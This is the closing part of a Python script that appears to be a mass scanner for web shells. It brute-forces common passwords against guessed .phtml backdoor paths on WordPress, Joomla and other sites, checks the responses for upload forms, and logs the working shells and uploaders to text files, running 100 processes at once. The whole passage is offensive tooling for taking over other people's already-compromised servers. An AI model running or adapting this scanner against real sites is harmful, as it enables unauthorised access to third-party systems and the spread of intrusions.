													if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH24+shell+'.phtml'+'#123456')
													else :
														p123123 = requests.post(SH24+shell+'.phtml',data=password_123123,timeout=15).content
														if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH24+shell+'.phtml'+'#123123')
														else :
															p123321 = requests.post(SH24+shell+'.phtml',data=password_123321,timeout=15).content
															if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH24+shell+'.phtml'+'#123321')
															else :
																p123456789 = requests.post(SH24+shell+'.phtml',data=password_123456789,timeout=15).content
																if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH24+shell+'.phtml'+'#123456789')
																else :
																	p1234567890 = requests.post(SH24+shell+'.phtml',data=password_1234567890,timeout=15).content
																	if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH24+shell+'.phtml'+'#1234567890')
																	else :
																		phaurgeulis = requests.post(SH24+shell+'.phtml',data=password_haurgeulis,timeout=15).content
																		if 'Andela1C3' in phaurgeulis  :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH24+shell+'.phtml'+'#haurgeulis')
																		else :
																			print(' # '+site +' --> {}[Failed]'.format(fr))																			
				else :
					print(' # '+site +' --> {}[Failed]'.format(fr))
		elif ' type="file"' in site_check or ' type=\'file\'' in site_check or ' type= "file"' in site_check or ' type= \'file\'' in site_check or ' type = "file"' in site_check or ' type = \'file\'' in site_check or ' type ="file"' in site_check or ' type =\'file\'' in site_check or ' type=file' in site_check or ' type =file' in site_check or ' type= file' in site_check or ' type = file' in site_check :	
			print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
			with open('UPloaders-Failed.txt', mode='a') as ccc:
				ccc.write(site+'/ [Vuln Register]')				
		elif ' type="file"' in up_check or ' type=\'file\'' in up_check or ' type= "file"' in up_check or ' type= \'file\'' in up_check or ' type = "file"' in up_check or ' type = \'file\'' in up_check or ' type ="file"' in up_check or ' type =\'file\'' in up_check or ' type=file' in up_check or ' type =file' in up_check or ' type= file' in up_check or ' type = file' in up_check or 'Upload</a> ]</li><li>[' in up_check or 'upload</a><li><a>Sym' in up_check :	
			print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
			with open('UPloaders.txt', mode='a') as cc:
				cc.write(SH20+' [Vuln]')
		elif ' type="file"' in upload_check or ' type=\'file\'' in upload_check or ' type= "file"' in upload_check or ' type= \'file\'' in upload_check or ' type = "file"' in upload_check or ' type = \'file\'' in upload_check or ' type ="file"' in upload_check or ' type =\'file\'' in upload_check or ' type=file' in upload_check or ' type =file' in upload_check or ' type= file' in upload_check or ' type = file' in upload_check or 'Upload</a> ]</li><li>[' in upload_check or 'upload</a><li><a>Sym' in upload_check :
			print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
			with open('UPloaders.txt', mode='a') as cc:
				cc.write(SH21+' [Vuln]')
		elif ' type="file"' in shell_check or ' type=\'file\'' in shell_check or ' type= "file"' in shell_check or ' type= \'file\'' in shell_check or ' type = "file"' in shell_check or ' type = \'file\'' in shell_check or ' type ="file"' in shell_check or ' type =\'file\'' in shell_check or ' type=file' in shell_check or ' type =file' in shell_check or ' type= file' in shell_check or ' type = file' in shell_check or 'Upload</a> ]</li><li>[' in shell_check or 'upload</a><li><a>Sym' in shell_check :
			print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH14+'')
		else :
			print(' # '+site +' --> {}[Failed]'.format(fr))
	except : 
		print(' # '+site +' --> {}[Failed]'.format(fr))

def WordPress(site) :
	WordPress1(site)
	WordPress2(site)

def Joomla(site) :
	Joomla2(site)
	Joomla1(site)
	
def All(site) :
	WordPress1(site)
	WordPress2(site)
	Joomla2(site)
	Joomla1(site)
	Other(site)

if w == 1 :		
	mp = Pool(100)
	mp.map(WordPress, target)
	mp.close()
	mp.join()
elif w == 2 :
	mp = Pool(100)
	mp.map(Joomla, target)
	mp.close()
	mp.join()
elif w == 3 :
	mp = Pool(100)
	mp.map(Other, target)
	mp.close()
	mp.join()
elif w == 4 :
	mp = Pool(100)
	mp.map(All, target)
	mp.close()
	mp.join()		
else :
	print("      Go to hell :P ")
	sys.exit(0)	
